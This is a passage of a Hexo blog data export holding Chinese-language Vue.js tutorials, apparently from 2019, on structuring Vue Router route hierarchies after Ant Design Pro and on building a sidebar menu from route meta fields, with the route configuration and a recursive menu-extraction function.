=&gt;</span></span><br><span class=\"line\">                <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                  <span class=\"comment\">/* webpackChunkName: \"dashboard\" */</span> <span class=\"string\">\"./views/Dashboard/Analysis.vue\"</span></span><br><span class=\"line\">                )</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          ]</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"comment\">// form</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/form\"</span>,</span><br><span class=\"line\">          name: <span class=\"string\">\"form\"</span>,</span><br><span class=\"line\">          meta: &#123; <span class=\"attr\">icon</span>: <span class=\"string\">\"form\"</span>, <span class=\"attr\">title</span>: <span class=\"string\">\"表单\"</span>, <span class=\"attr\">authority</span>: [<span class=\"string\">\"admin\"</span>] &#125;,</span><br><span class=\"line\">          component: &#123; <span class=\"attr\">render</span>: <span class=\"function\"><span class=\"params\">h</span> =&gt;</span> h(<span class=\"string\">\"router-view\"</span>) &#125;,</span><br><span class=\"line\">          children: [</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              path: <span class=\"string\">\"/form/basic-form\"</span>,</span><br><span class=\"line\">              name: <span class=\"string\">\"basic-form\"</span>,</span><br><span class=\"line\">              meta: &#123; <span class=\"attr\">title</span>: <span class=\"string\">\"基础表单\"</span> &#125;,</span><br><span class=\"line\">              component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                  <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/BasicForm.vue\"</span></span><br><span class=\"line\">                )</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              path: <span class=\"string\">\"/form/step-form\"</span>,</span><br><span class=\"line\">              name: <span class=\"string\">\"step-form\"</span>,</span><br><span class=\"line\">              hideChildrenInMenu: <span class=\"literal\">true</span>,</span><br><span class=\"line\">              meta: &#123; <span class=\"attr\">title</span>: <span class=\"string\">\"分布表单\"</span> &#125;,</span><br><span class=\"line\">              component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                  <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/StepForm.vue\"</span></span><br><span class=\"line\">                ),</span><br><span class=\"line\">              children: [</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  path: <span class=\"string\">\"/form/step-form\"</span>,</span><br><span class=\"line\">                  redirect: <span class=\"string\">\"/form/step-form/info\"</span></span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  path: <span class=\"string\">\"/form/step-form/info\"</span>,</span><br><span class=\"line\">                  name: <span class=\"string\">\"info\"</span>,</span><br><span class=\"line\">                  component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                    <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                      <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/StepForm/Step1\"</span></span><br><span class=\"line\">                    )</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  path: <span class=\"string\">\"/form/step-form/confirm\"</span>,</span><br><span class=\"line\">                  name: <span class=\"string\">\"confirm\"</span>,</span><br><span class=\"line\">                  component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                    <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                      <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/StepForm/Step2\"</span></span><br><span class=\"line\">                    )</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  path: <span class=\"string\">\"/form/step-form/result\"</span>,</span><br><span class=\"line\">                  name: <span class=\"string\">\"result\"</span>,</span><br><span class=\"line\">                  component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                    <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                      <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/StepForm/Step3\"</span></span><br><span class=\"line\">                    )</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">              ]</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          ]</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>一个高扩展性的路由应该是根据页面展示结构的特点进行的抽象，再结合业务模块进行的合理层级划分。本次总结是根据中后台管理系统<a href=\"https://preview.pro.ant.design/dashboard/analysis\" target=\"_blank\" rel=\"noopener\">Ant Design Pro</a>。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>整体来说没什么难点，主要对新手有个目录结构案例参考，其次对于单纯提供 <code>router-view</code> 的组件可以用函数式组件<code>component: { render: h =&gt; h(&quot;router-view&quot;) }</code>。</p>\n<h2 id=\"第一层级\"><a href=\"#第一层级\" class=\"headerlink\" title=\"第一层级\"></a>第一层级</h2><p>第一层级应该是布局模板，例如登录注册页面与其他的内容展示页，通常页面布局结构是不同的，因此可以分成两个 UserLayout.vue 和 BasicLayout.vue。</p>\n<h2 id=\"第二层级\"><a href=\"#第二层级\" class=\"headerlink\" title=\"第二层级\"></a>第二层级</h2><p>一级业务模块，直观的就是对应的一级菜单，例如 Dashboard、个人页等。</p>\n<h2 id=\"其他层级\"><a href=\"#其他层级\" class=\"headerlink\" title=\"其他层级\"></a>其他层级</h2><p>按照业务模块层层嵌套，例如 Dashboard 下面有 分析页 和 监控页等。</p>\n<h2 id=\"示例代码\"><a href=\"#示例代码\" class=\"headerlink\" title=\"示例代码\"></a>示例代码</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> router = <span class=\"keyword\">new</span> Router(&#123;</span><br><span class=\"line\">  mode: <span class=\"string\">\"history\"</span>,</span><br><span class=\"line\">  base: process.env.BASE_URL,</span><br><span class=\"line\">  routes: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      path: <span class=\"string\">\"/user\"</span>,</span><br><span class=\"line\">      hideInMenu: <span class=\"literal\">true</span>,</span><br><span class=\"line\">      component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">        <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"user\" */</span> <span class=\"string\">\"./layouts/UserLayout.vue\"</span>),</span><br><span class=\"line\">      children: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/user\"</span>,</span><br><span class=\"line\">          redirect: <span class=\"string\">\"/user/login\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/user/login\"</span>,</span><br><span class=\"line\">          name: <span class=\"string\">\"login\"</span>,</span><br><span class=\"line\">          component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">            <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"user\" */</span> <span class=\"string\">\"./views/User/Login.vue\"</span>)</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/user/register\"</span>,</span><br><span class=\"line\">          name: <span class=\"string\">\"register\"</span>,</span><br><span class=\"line\">          component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">            <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"user\" */</span> <span class=\"string\">\"./views/User/Register.vue\"</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      path: <span class=\"string\">\"/\"</span>,</span><br><span class=\"line\">      meta: &#123; <span class=\"attr\">authority</span>: [<span class=\"string\">\"user\"</span>, <span class=\"string\">\"admin\"</span>] &#125;,</span><br><span class=\"line\">      component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">        <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"basic\" */</span> <span class=\"string\">\"./layouts/BasicLayout.vue\"</span>),</span><br><span class=\"line\">      children: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/\"</span>,</span><br><span class=\"line\">          redirect: <span class=\"string\">\"/dashboard/analysis\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"comment\">// dashboard</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/dashboard\"</span>,</span><br><span class=\"line\">          name: <span class=\"string\">\"dashboard\"</span>,</span><br><span class=\"line\">          meta: &#123; <span class=\"attr\">icon</span>: <span class=\"string\">\"dashboard\"</span>, <span class=\"attr\">title</span>: <span class=\"string\">\"仪表盘\"</span> &#125;,</span><br><span class=\"line\">          component: &#123; <span class=\"attr\">render</span>: <span class=\"function\"><span class=\"params\">h</span> =&gt;</span> h(<span class=\"string\">\"router-view\"</span>) &#125;,</span><br><span class=\"line\">          children: [</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              path: <span class=\"string\">\"/dashboard/analysis\"</span>,</span><br><span class=\"line\">              name: <span class=\"string\">\"analysis\"</span>,</span><br><span class=\"line\">              meta: &#123; <span class=\"attr\">title</span>: <span class=\"string\">\"分析页\"</span> &#125;,</span><br><span class=\"line\">              component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                  <span class=\"comment\">/* webpackChunkName: \"dashboard\" */</span> <span class=\"string\">\"./views/Dashboard/Analysis.vue\"</span></span><br><span class=\"line\">                )</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          ]</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"comment\">// form</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/form\"</span>,</span><br><span class=\"line\">          name: <span class=\"string\">\"form\"</span>,</span><br><span class=\"line\">          meta: &#123; <span class=\"attr\">icon</span>: <span class=\"string\">\"form\"</span>, <span class=\"attr\">title</span>: <span class=\"string\">\"表单\"</span>, <span class=\"attr\">authority</span>: [<span class=\"string\">\"admin\"</span>] &#125;,</span><br><span class=\"line\">          component: &#123; <span class=\"attr\">render</span>: <span class=\"function\"><span class=\"params\">h</span> =&gt;</span> h(<span class=\"string\">\"router-view\"</span>) &#125;,</span><br><span class=\"line\">          children: [</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              path: <span class=\"string\">\"/form/basic-form\"</span>,</span><br><span class=\"line\">              name: <span class=\"string\">\"basic-form\"</span>,</span><br><span class=\"line\">              meta: &#123; <span class=\"attr\">title</span>: <span class=\"string\">\"基础表单\"</span> &#125;,</span><br><span class=\"line\">              component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                  <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/BasicForm.vue\"</span></span><br><span class=\"line\">                )</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              path: <span class=\"string\">\"/form/step-form\"</span>,</span><br><span class=\"line\">              name: <span class=\"string\">\"step-form\"</span>,</span><br><span class=\"line\">              hideChildrenInMenu: <span class=\"literal\">true</span>,</span><br><span class=\"line\">              meta: &#123; <span class=\"attr\">title</span>: <span class=\"string\">\"分布表单\"</span> &#125;,</span><br><span class=\"line\">              component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                  <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/StepForm.vue\"</span></span><br><span class=\"line\">                ),</span><br><span class=\"line\">              children: [</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  path: <span class=\"string\">\"/form/step-form\"</span>,</span><br><span class=\"line\">                  redirect: <span class=\"string\">\"/form/step-form/info\"</span></span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  path: <span class=\"string\">\"/form/step-form/info\"</span>,</span><br><span class=\"line\">                  name: <span class=\"string\">\"info\"</span>,</span><br><span class=\"line\">                  component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                    <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                      <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/StepForm/Step1\"</span></span><br><span class=\"line\">                    )</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  path: <span class=\"string\">\"/form/step-form/confirm\"</span>,</span><br><span class=\"line\">                  name: <span class=\"string\">\"confirm\"</span>,</span><br><span class=\"line\">                  component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                    <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                      <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/StepForm/Step2\"</span></span><br><span class=\"line\">                    )</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  path: <span class=\"string\">\"/form/step-form/result\"</span>,</span><br><span class=\"line\">                  name: <span class=\"string\">\"result\"</span>,</span><br><span class=\"line\">                  component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                    <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                      <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/StepForm/Step3\"</span></span><br><span class=\"line\">                    )</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">              ]</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          ]</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>"},{"title":"Vue实战@根据路由生成菜单","date":"2019-05-21T07:02:51.000Z","updated":"2019-05-21T07:02:51.000Z","_content":"\n# 概述\n\n整体思路就是在每个路由下面增加 meta 属性维护需要在菜单显示的数据，例如`meta: { icon: \"dashboard\", title: \"仪表盘\" }`，以及加些标志位区分需要过滤掉的路由，然后遍历`routes`获取相关数据，最后页面渲染显示。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 路由配置参考\n\n```js\nconst router = new Router({\n  mode: \"history\",\n  base: process.env.BASE_URL,\n  routes: [\n    {\n      path: \"/user\",\n      hideInMenu: true,\n      component: () =>\n        import(/* webpackChunkName: \"user\" */ \"./layouts/UserLayout.vue\"),\n      children: [\n        {\n          path: \"/user\",\n          redirect: \"/user/login\"\n        },\n        {\n          path: \"/user/login\",\n          name: \"login\",\n          component: () =>\n            import(/* webpackChunkName: \"user\" */ \"./views/User/Login.vue\")\n        },\n        {\n          path: \"/user/register\",\n          name: \"register\",\n          component: () =>\n            import(/* webpackChunkName: \"user\" */ \"./views/User/Register.vue\")\n        }\n      ]\n    },\n    {\n      path: \"/\",\n      meta: { authority: [\"user\", \"admin\"] },\n      component: () =>\n        import(/* webpackChunkName: \"basic\" */ \"./layouts/BasicLayout.vue\"),\n      children: [\n        {\n          path: \"/\",\n          redirect: \"/dashboard/analysis\"\n        },\n        // dashboard\n        {\n          path: \"/dashboard\",\n          name: \"dashboard\",\n          meta: { icon: \"dashboard\", title: \"仪表盘\" },\n          component: { render: h => h(\"router-view\") },\n          children: [\n            {\n              path: \"/dashboard/analysis\",\n              name: \"analysis\",\n              meta: { title: \"分析页\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"dashboard\" */ \"./views/Dashboard/Analysis.vue\"\n                )\n            }\n          ]\n        },\n        // form\n        {\n          path: \"/form\",\n          name: \"form\",\n          meta: { icon: \"form\", title: \"表单\", authority: [\"admin\"] },\n          component: { render: h => h(\"router-view\") },\n          children: [\n            {\n              path: \"/form/basic-form\",\n              name: \"basic-form\",\n              meta: { title: \"基础表单\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"form\" */ \"./views/Forms/BasicForm.vue\"\n                )\n            },\n            {\n              path: \"/form/step-form\",\n              name: \"step-form\",\n              hideChildrenInMenu: true,\n              meta: { title: \"分布表单\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm.vue\"\n                ),\n              children: [\n                {\n                  path: \"/form/step-form\",\n                  redirect: \"/form/step-form/info\"\n                },\n                {\n                  path: \"/form/step-form/info\",\n                  name: \"info\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step1\"\n                    )\n                },\n                {\n                  path: \"/form/step-form/confirm\",\n                  name: \"confirm\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step2\"\n                    )\n                },\n                {\n                  path: \"/form/step-form/result\",\n                  name: \"result\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step3\"\n                    )\n                }\n              ]\n            }\n          ]\n        }\n      ]\n    },\n    {\n      path: \"/403\",\n      name: \"403\",\n      hideInMenu: true,\n      component: Fobidden\n    },\n    {\n      path: \"*\",\n      name: \"404\",\n      hideInMenu: true,\n      component: NotFound\n    }\n  ]\n});\n```\n\n## 提取菜单显示所需信息\n\n```js\ngetMenuData(routes = [], parentKeys = [], selectedKey) {\n  const menuData = [];\n  routes.forEach(element => {\n    if (element.name && !element.hideInMenu) {\n      this.openKeysMap[element.path] = parentKeys;\n      this.selectedKeysMap[element.path] = [selectedKey || element.path];\n      const newItem = { ...element };\n      delete newItem.children;\n      if (element.children && !element.hideChildrenInMenu) {\n        newItem.children = this.getMenuData(element.children, [\n          ...parentKeys,\n          element.path\n        ]);\n      } else {\n        this.getMenuData(\n          element.children,\n          selectedKey ? parentKeys : [...parentKeys, element.path],\n          selectedKey || element.path\n        );\n      }\n      menuData.push(newItem);\n    } else if (\n      !element.hideInMenu &&\n      !element.hideChildrenInMenu &&\n      element.children\n    ) {\n      menuData.push(\n        ...this.getMenuData(element.children, [...parentKeys, element.path])\n      );\n    }\n  });\n  return menuData;\n}\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","source":"_posts/2019/05/vue-in-action-routerMenu.md","raw":"---\ntitle: Vue实战@根据路由生成菜单\npermalink: vue-in-action-routerMenu\ntags:\n  - Vue\ncategories:\n  - 框架与库\n  - Vue\ndate: 2019-05-21 15:02:51\nupdated: 2019-05-21 15:02:51\n---\n\n# 概述\n\n整体思路就是在每个路由下面增加 meta 属性维护需要在菜单显示的数据，例如`meta: { icon: \"dashboard\", title: \"仪表盘\" }`，以及加些标志位区分需要过滤掉的路由，然后遍历`routes`获取相关数据，最后页面渲染显示。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 路由配置参考\n\n```js\nconst router = new Router({\n  mode: \"history\",\n  base: process.env.BASE_URL,\n  routes: [\n    {\n      path: \"/user\",\n      hideInMenu: true,\n      component: () =>\n        import(/* webpackChunkName: \"user\" */ \"./layouts/UserLayout.vue\"),\n      children: [\n        {\n          path: \"/user\",\n          redirect: \"/user/login\"\n        },\n        {\n          path: \"/user/login\",\n          name: \"login\",\n          component: () =>\n            import(/* webpackChunkName: \"user\" */ \"./views/User/Login.vue\")\n        },\n        {\n          path: \"/user/register\",\n          name: \"register\",\n          component: () =>\n            import(/* webpackChunkName: \"user\" */ \"./views/User/Register.vue\")\n        }\n      ]\n    },\n    {\n      path: \"/\",\n      meta: { authority: [\"user\", \"admin\"] },\n      component: () =>\n        import(/* webpackChunkName: \"basic\" */ \"./layouts/BasicLayout.vue\"),\n      children: [\n        {\n          path: \"/\",\n          redirect: \"/dashboard/analysis\"\n        },\n        // dashboard\n        {\n          path: \"/dashboard\",\n          name: \"dashboard\",\n          meta: { icon: \"dashboard\", title: \"仪表盘\" },\n          component: { render: h => h(\"router-view\") },\n          children: [\n            {\n              path: \"/dashboard/analysis\",\n              name: \"analysis\",\n              meta: { title: \"分析页\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"dashboard\" */ \"./views/Dashboard/Analysis.vue\"\n                )\n            }\n          ]\n        },\n        // form\n        {\n          path: \"/form\",\n          name: \"form\",\n          meta: { icon: \"form\", title: \"表单\", authority: [\"admin\"] },\n          component: { render: h => h(\"router-view\") },\n          children: [\n            {\n              path: \"/form/basic-form\",\n              name: \"basic-form\",\n              meta: { title: \"基础表单\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"form\" */ \"./views/Forms/BasicForm.vue\"\n                )\n            },\n            {\n              path: \"/form/step-form\",\n              name: \"step-form\",\n              hideChildrenInMenu: true,\n              meta: { title: \"分布表单\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm.vue\"\n                ),\n              children: [\n                {\n                  path: \"/form/step-form\",\n                  redirect: \"/form/step-form/info\"\n                },\n                {\n                  path: \"/form/step-form/info\",\n                  name: \"info\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step1\"\n                    )\n                },\n                {\n                  path: \"/form/step-form/confirm\",\n                  name: \"confirm\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step2\"\n                    )\n                },\n                {\n                  path: \"/form/step-form/result\",\n                  name: \"result\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step3\"\n                    )\n                }\n              ]\n            }\n          ]\n        }\n      ]\n    },\n    {\n      path: \"/403\",\n      name: \"403\",\n      hideInMenu: true,\n      component: Fobidden\n    },\n    {\n      path: \"*\",\n      name: \"404\",\n      hideInMenu: true,\n      component: NotFound\n    }\n  ]\n});\n```\n\n## 提取菜单显示所需信息\n\n```js\ngetMenuData(routes = [], parentKeys = [], selectedKey) {\n  const menuData = [];\n  routes.forEach(element => {\n    if (element.name && !element.hideInMenu) {\n      this.openKeysMap[element.path] = parentKeys;\n      this.selectedKeysMap[element.path] = [selectedKey || element.path];\n      const newItem = { ...element };\n      delete newItem.children;\n      if (element.children && !element.hideChildrenInMenu) {\n        newItem.children = this.getMenuData(element.children, [\n          ...parentKeys,\n          element.path\n        ]);\n      } else {\n        this.getMenuData(\n          element.children,\n          selectedKey ? parentKeys : [...parentKeys, element.path],\n          selectedKey || element.path\n        );\n      }\n      menuData.push(newItem);\n    } else if (\n      !element.hideInMenu &&\n      !element.hideChildrenInMenu &&\n      element.children\n    ) {\n      menuData.push(\n        ...this.getMenuData(element.children, [...parentKeys, element.path])\n      );\n    }\n  });\n  return menuData;\n}\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","slug":"vue-in-action-routerMenu","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xs0070wovvptp8b1hp","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>整体思路就是在每个路由下面增加 meta 属性维护需要在菜单显示的数据，例如<code>meta: { icon: &quot;dashboard&quot;, title: &quot;仪表盘&quot; }</code>，以及加些标志位区分需要过滤掉的路由，然后遍历<code>routes</code>获取相关数据，最后页面渲染显示。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"路由配置参考\"><a href=\"#路由配置参考\" class=\"headerlink\" title=\"路由配置参考\"></a>路由配置参考</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span 